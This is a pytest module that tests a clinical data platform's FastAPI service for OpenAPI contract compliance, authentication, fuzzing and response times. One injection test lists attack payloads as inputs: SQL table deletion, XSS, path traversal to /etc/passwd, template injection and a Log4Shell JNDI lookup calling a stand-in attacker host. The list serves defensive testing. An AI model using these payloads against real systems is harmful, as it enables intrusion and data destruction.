"""
API Contract Testing with Schemathesis

This module provides comprehensive property-based testing for the Clinical Data Platform API
using Schemathesis to ensure OpenAPI specification compliance and robust error handling.
"""

import json
import os
import pytest
import schemathesis
from fastapi.testclient import TestClient
from unittest.mock import patch, MagicMock
from hypothesis import settings, strategies as st
from schemathesis.checks import response_schema_conformance, status_code_conformance

from clinical_platform.api.main import app
from clinical_platform.config import get_config


# Create the schema for schemathesis
schema = schemathesis.from_asgi("/openapi.json", app)

# Test configuration
TEST_API_KEY = "test-api-key-12345"
INVALID_API_KEY = "invalid-key"


class TestAPIContract:
    """API contract testing using property-based testing with Schemathesis."""
    
    @pytest.fixture(autouse=True)
    def setup_test_environment(self):
        """Setup test environment with mock configuration."""
        with patch('clinical_platform.config.get_config') as mock_config:
            # Mock configuration for testing
            mock_config_obj = MagicMock()
            mock_config_obj.security.api_key.get_secret_value.return_value = TEST_API_KEY
            mock_config_obj.warehouse.duckdb_path = ":memory:"
            mock_config.return_value = mock_config_obj
            
            # Mock DuckDB for isolated testing
            with patch('duckdb.connect') as mock_duckdb:
                mock_conn = MagicMock()
                mock_duckdb.return_value = mock_conn
                
                # Setup mock data responses
                mock_conn.execute.return_value.fetchall.return_value = [
                    ("STUDY001",), ("STUDY002",)
                ]
                mock_conn.execute.return_value.fetch_df.return_value.empty = False
                mock_conn.execute.return_value.fetch_df.return_value.to_dict.return_value = [{
                    "subject_id": "SUBJ001",
                    "study_id": "STUDY001", 
                    "arm": "treatment"
                }]
                
                yield


# Schemathesis test cases
@schema.parametrize()
@settings(max_examples=100, deadline=10000)  # Increased deadline for complex tests
def test_api_contract_compliance(case):
    """
    Property-based test that generates test cases from OpenAPI schema.
    
    This test:
    1. Generates valid requests according to the OpenAPI schema
    2. Validates responses conform to the schema
    3. Checks status codes are appropriate
    4. Ensures consistent API behavior
    """
    # Add authentication headers for protected endpoints
    if case.path_parameters.get("endpoint") not in ["/health"]:
        case.headers = case.headers or {}
        case.headers["Authorization"] = f"Bearer {TEST_API_KEY}"
    
    # Execute the test case
    response = case.call_asgi(app)
    
    # Validate response against OpenAPI schema
    case.validate_response(response)


@schema.parametrize(endpoint="/health")
@settings(max_examples=50)
def test_health_endpoint_contract(case):
    """Test health endpoint contract compliance."""
    response = case.call_asgi(app)
    
    # Health endpoint should always return 200
    assert response.status_code == 200
    
    # Validate response schema
    case.validate_response(response)
    
    # Additional business logic validation
    data = response.json()
    assert "status" in data
    assert data["status"] == "ok"


@schema.parametrize(endpoint="/score")
@settings(max_examples=100)
def test_score_endpoint_contract(case):
    """Test ML scoring endpoint with property-based testing."""
    # Add required authentication
    case.headers = case.headers or {}
    case.headers["Authorization"] = f"Bearer {TEST_API_KEY}"
    
    response = case.call_asgi(app)
    
    # Validate response schema
    case.validate_response(response)
    
    # Additional business logic validation for successful responses
    if response.status_code == 200:
        data = response.json()
        assert "risk" in data
        assert 0.0 <= data["risk"] <= 1.0
        assert "model_version" in data
        assert data["model_version"] is not None


@schema.parametrize(endpoint="/subjects/{subject_id}")
@settings(max_examples=50)
def test_subjects_endpoint_contract(case):
    """Test subjects endpoint with various subject ID patterns."""
    # Add required authentication
    case.headers = case.headers or {}
    case.headers["Authorization"] = f"Bearer {TEST_API_KEY}"
    
    response = case.call_asgi(app)
    
    # Validate response schema
    case.validate_response(response)
    
    # Additional validation for successful responses
    if response.status_code == 200:
        data = response.json()
        assert "subject_id" in data
        assert "study_id" in data


class TestAPISecurityContract:
    """Test API security requirements and authentication contracts."""
    
    def test_authentication_required_endpoints(self):
        """Test that protected endpoints require authentication."""
        client = TestClient(app)
        
        protected_endpoints = [
            ("GET", "/studies"),
            ("GET", "/subjects/SUBJ001"),
            ("POST", "/score"),
        ]
        
        for method, endpoint in protected_endpoints:
            if method == "GET":
                response = client.get(endpoint)
            elif method == "POST":
                response = client.post(endpoint, json={
                    "AGE": 50, "AE_COUNT": 1, "SEVERE_AE_COUNT": 0
                })
            
            assert response.status_code == 401
            assert "API key required" in response.json()["detail"]
    
    def test_invalid_api_key_rejection(self):
        """Test that invalid API keys are rejected."""
        client = TestClient(app)
        headers = {"Authorization": f"Bearer {INVALID_API_KEY}"}
        
        with patch('clinical_platform.config.get_config') as mock_config:
            mock_config_obj = MagicMock()
            mock_config_obj.security.api_key.get_secret_value.return_value = TEST_API_KEY
            mock_config.return_value = mock_config_obj
            
            response = client.get("/studies", headers=headers)
            assert response.status_code == 401
            assert "Invalid API key" in response.json()["detail"]
    
    @pytest.mark.parametrize("malicious_input", [
        "'; DROP TABLE subjects; --",
        "<script>alert('xss')</script>",
        "../../../etc/passwd",
        "{{7*7}}",
        "${jndi:ldap://attacker.com/a}",
        "\x00\x01\x02\x03",
        "A" * 1000,  # Very long string
    ])
    def test_security_injection_protection(self, malicious_input):
        """Test protection against various injection attacks."""
        client = TestClient(app)
        headers = {"Authorization": f"Bearer {TEST_API_KEY}"}
        
        with patch('clinical_platform.config.get_config') as mock_config:
            mock_config_obj = MagicMock()
            mock_config_obj.security.api_key.get_secret_value.return_value = TEST_API_KEY
            mock_config_obj.warehouse.duckdb_path = ":memory:"
            mock_config.return_value = mock_config_obj
            
            with patch('duckdb.connect'):
                # Test subject ID injection
                response = client.get(f"/subjects/{malicious_input}", headers=headers)
                # Should either be 400 (validation error) or 404 (not found), not 500 (injection)
                assert response.status_code in [400, 404]
                
                # Test score endpoint with malicious data
                response = client.post("/score", headers=headers, json={
                    "AGE": malicious_input if isinstance(malicious_input, (int, float)) else 50,
                    "AE_COUNT": 1,
                    "SEVERE_AE_COUNT": 0
                })
                # Should be 422 (validation error) for invalid data types
                assert response.status_code in [422, 400]


class TestAPIFuzzTesting:
    """Fuzzing tests to discover edge cases and security vulnerabilities."""
    
    @pytest.mark.parametrize("fuzz_strategy", [
        "boundary_values",
        "random_strings", 
        "special_characters",
        "unicode_attacks",
        "large_payloads"
    ])
    def test_fuzz_score_endpoint(self, fuzz_strategy):
        """Fuzz testing for the ML scoring endpoint."""
        client = TestClient(app)
        headers = {"Authorization": f"Bearer {TEST_API_KEY}"}
        
        with patch('clinical_platform.config.get_config') as mock_config:
            mock_config_obj = MagicMock()
            mock_config_obj.security.api_key.get_secret_value.return_value = TEST_API_KEY
            mock_config.return_value = mock_config_obj
            
            # Generate fuzzing test cases based on strategy
            if fuzz_strategy == "boundary_values":
                test_cases = [
                    {"AGE": -1, "AE_COUNT": 0, "SEVERE_AE_COUNT": 0},
                    {"AGE": 121, "AE_COUNT": 0, "SEVERE_AE_COUNT": 0},
                    {"AGE": 50, "AE_COUNT": -1, "SEVERE_AE_COUNT": 0},
                    {"AGE": 50, "AE_COUNT": 101, "SEVERE_AE_COUNT": 0},
                    {"AGE": 50, "AE_COUNT": 0, "SEVERE_AE_COUNT": -1},
                    {"AGE": 50, "AE_COUNT": 10, "SEVERE_AE_COUNT": 51},
                    {"AGE": 50, "AE_COUNT": 10, "SEVERE_AE_COUNT": 11},  # Severe > Total
                ]
            elif fuzz_strategy == "random_strings":
                test_cases = [
                    {"AGE": "not_a_number", "AE_COUNT": 1, "SEVERE_AE_COUNT": 0},
                    {"AGE": 50, "AE_COUNT": "invalid", "SEVERE_AE_COUNT": 0},
                    {"AGE": 50, "AE_COUNT": 1, "SEVERE_AE_COUNT": "bad"},
                ]
            elif fuzz_strategy == "special_characters":
                test_cases = [
                    {"AGE": float('inf'), "AE_COUNT": 1, "SEVERE_AE_COUNT": 0},
                    {"AGE": float('-inf'), "AE_COUNT": 1, "SEVERE_AE_COUNT": 0},
                    {"AGE": float('nan'), "AE_COUNT": 1, "SEVERE_AE_COUNT": 0},
                ]
            elif fuzz_strategy == "unicode_attacks":
                test_cases = [
                    {"AGE": "５０", "AE_COUNT": 1, "SEVERE_AE_COUNT": 0},  # Full-width numbers
                    {"AGE": "𝟓𝟎", "AE_COUNT": 1, "SEVERE_AE_COUNT": 0},   # Mathematical alphanumeric
                ]
            elif fuzz_strategy == "large_payloads":
                test_cases = [
                    {"AGE": 50, "AE_COUNT": 1, "SEVERE_AE_COUNT": 0, "extra_field": "A" * 10000},
                ]
            
            for test_case in test_cases:
                response = client.post("/score", headers=headers, json=test_case)
                
                # Should handle all fuzzing gracefully without 500 errors
                assert response.status_code != 500, f"Server error on fuzz case: {test_case}"
                
                # Should return appropriate error codes for invalid data
                if fuzz_strategy != "boundary_values" or any(
                    test_case.get(field, 0) < 0 or 
                    (field == "AGE" and test_case.get(field, 0) > 120) or
                    (field in ["AE_COUNT", "SEVERE_AE_COUNT"] and test_case.get(field, 0) > 100)
                    for field in ["AGE", "AE_COUNT", "SEVERE_AE_COUNT"]
                ):
                    assert response.status_code in [400, 422], f"Expected validation error for: {test_case}"


class TestAPIPerformanceContract:
    """Test API performance characteristics and rate limiting."""
    
    def test_response_time_contract(self):
        """Test that API responses are within acceptable time limits."""
        import time
        
        client = TestClient(app)
        headers = {"Authorization": f"Bearer {TEST_API_KEY}"}
        
        with patch('clinical_platform.config.get_config') as mock_config:
            mock_config_obj = MagicMock()
            mock_config_obj.security.api_key.get_secret_value.return_value = TEST_API_KEY
            mock_config.return_value = mock_config_obj
            
            # Test health endpoint performance
            start_time = time.time()
            response = client.get("/health")
            elapsed = time.time() - start_time
            
            assert response.status_code == 200
            assert elapsed < 1.0, f"Health endpoint too slow: {elapsed:.3f}s"
            
            # Test score endpoint performance
            with patch('duckdb.connect'):
                start_time = time.time()
                response = client.post("/score", headers=headers, json={
                    "AGE": 50, "AE_COUNT": 1, "SEVERE_AE_COUNT": 0
                })
                elapsed = time.time() - start_time
                
                assert response.status_code == 200
                assert elapsed < 2.0, f"Score endpoint too slow: {elapsed:.3f}s"
    
    def test_concurrent_request_handling(self):
        """Test API behavior under concurrent load."""
        import threading
        import queue
        
        client = TestClient(app)
        headers = {"Authorization": f"Bearer {TEST_API_KEY}"}
        results = queue.Queue()
        
        def make_request():
            try:
                response = client.get("/health")
                results.put(("success", response.status_code))
            except Exception as e:
                results.put(("error", str(e)))
        
        # Create multiple concurrent requests
        threads = []
        for _ in range(10):
            thread = threading.Thread(target=make_request)
            threads.append(thread)
            thread.start()
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join(timeout=5)
        
        # Collect results
        success_count = 0
        while not results.empty():
            result_type, result_value = results.get()
            if result_type == "success" and result_value == 200:
                success_count += 1
        
        # All requests should succeed
        assert success_count == 10, f"Only {success_count}/10 concurrent requests succeeded"


# Custom Schemathesis hooks for advanced testing
@schema.hook
def before_generate_case(context, strategy):
    """Hook to modify test case generation."""
    # Add authentication headers to generated cases
    if hasattr(strategy, 'headers'):
        if not strategy.headers:
            strategy.headers = {}
        strategy.headers["Authorization"] = f"Bearer {TEST_API_KEY}"
    
    return strategy


@schema.hook 
def after_call(context, case, response):
    """Hook to perform additional validation after API calls."""
    # Log response for debugging
    print(f"API call: {case.method} {case.path} -> {response.status_code}")
    
    # Check for potential security issues
    if response.status_code == 500:
        # Server errors might indicate security vulnerabilities
        response_text = response.text.lower()
        security_indicators = [
            "sql", "database", "traceback", "exception", 
            "error", "stack", "internal"
        ]
        
        if any(indicator in response_text for indicator in security_indicators):
            pytest.fail(f"Potential information disclosure in 500 response: {response.text[:200]}")


if __name__ == "__main__":
    # Run schemathesis CLI for additional testing
    import sys
    import subprocess
    
    # Generate OpenAPI schema for external testing
    os.system("python -c 'from clinical_platform.api.main import app; import json; print(json.dumps(app.openapi()))' > openapi.json")
    
    # Run schemathesis CLI tests
    result = subprocess.run([
        sys.executable, "-m", "schemathesis", "run", 
        "--checks", "all",
        "--hypothesis-max-examples", "50",
        "openapi.json"
    ], capture_output=True, text=True)
    
    print("Schemathesis CLI Output:")
    print(result.stdout)
    if result.stderr:
        print("Errors:")
        print(result.stderr)
    
    sys.exit(result.returncode)